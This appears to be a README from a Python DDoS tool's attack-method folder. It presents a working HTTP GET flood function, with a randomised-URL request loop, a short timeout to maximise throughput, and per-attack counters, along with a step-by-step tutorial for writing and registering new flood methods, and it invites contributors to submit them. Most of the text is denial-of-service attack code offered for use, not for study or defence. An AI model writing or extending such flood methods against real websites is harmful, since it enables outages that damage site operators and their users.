## Welcome to the arsenal!
Here you can view all "standard" attack methods/vectors, which can be used by anybody.
<br>
If you want to add a new method, its really simple

### - Creating the file
To start, you need to create a file, in `src/methods`

### - Starting on the actual code
All methods follow a simple "module" structure:

1. First, we have the license
```py
'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''
```
<br>

2. After that, we have the imports
```py
import time, requests
from src.core import Core
from src.utils import *
from src.useragent import *
```
<br>

3. And then the actual flood function
```py
def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        try:

            Core.session.get(
                utils().buildblock(url), 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout: # if we get a ReadTimeout error, we count it as sent
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1
```
<br>

4. Here, the method gets added to the global methods "database"
```py
# add the method to the methods dictionary
Core.methods.update({
    'GET': { # name, which will be used for the "-m/--method" argument
        'info': 'HTTP GET flood, with basic customizability', # information about the attack
        'func': flood # function
    }
})
```

### - Creating your own method
1. First, you need to add the license, which all other methods use (i will not show it here, due to the sheer size of the license)
2. After that, import the libraries you need
    - These 2 are REQUIRED, and should be imported at ANY cost:
        - `import time`: needed to calculate the stop time
        - `from src.core import Core`: needed for some core variables

3. Now, we can begin on the actual DDoS'ing function
    - The function should accept 3 arguments:
        - `attack_id`: the attack id, used for calculating the requests sent, failed and more
        - `url`: the target url
        - `stoptime`: the time at which to stop the loop, and stop attacking
    - Our code should now look something like this:
        ```py
        # bla bla license here

        # our imports
        import time
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
        ```
    
    - After that, we will start on the attack loop:
        ```py
        while time.time() < stoptime and not Core.killattack: # loops until the time is equal to the stoptime, or the Core.killattack flag has been set to True
            if not Core.attackrunning: # not running? just restart the loop
                continue
        ```
    - If we add that to our code, it will look like this:
        ```py
        # bla bla license here

        # our imports
        import time
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue
        ```
    
    - Now, we will start on the request sending
       - It is recommended to use the `Core.session` object, due to it being much faster
       - You can just do `requests.get` or `requests.post`, but it will take a huge hit on the performance
       - For the sake of the small tutorial, we will just be doing `requests.get`

       - start by adding the `requests.get` function, where the url will be the `url` argument passed to the function:
           ```py
           requests.get(url)
           ```
        
    - Now add the page requesting code to our method code:
        ```py
        # bla bla license here

        # our imports
        import time
        from src.core import Core

        # our attack function
        def attacker(attack_id, url, stoptime):
            while time.time() < stoptime and not Core.killattack:
                if not Core.attackrunning:
                    continue

                requests.get(url)
        ```
    
    - At last, we will be adding our newly created method to the core list of methods:
        ```py
        Core.methods.update({
            'MYCOOLFLOOD': { # your method name, which will be used for the "-m/--method" argument
                'info': 'Hey, look at this awesome flood i made!', # information about the attack
                'func': attacker # function
            }
        })
        ```
    
    - And done! You have now created your own special attack method.
    - If you wish to share it, just make a `pull` request with the new method included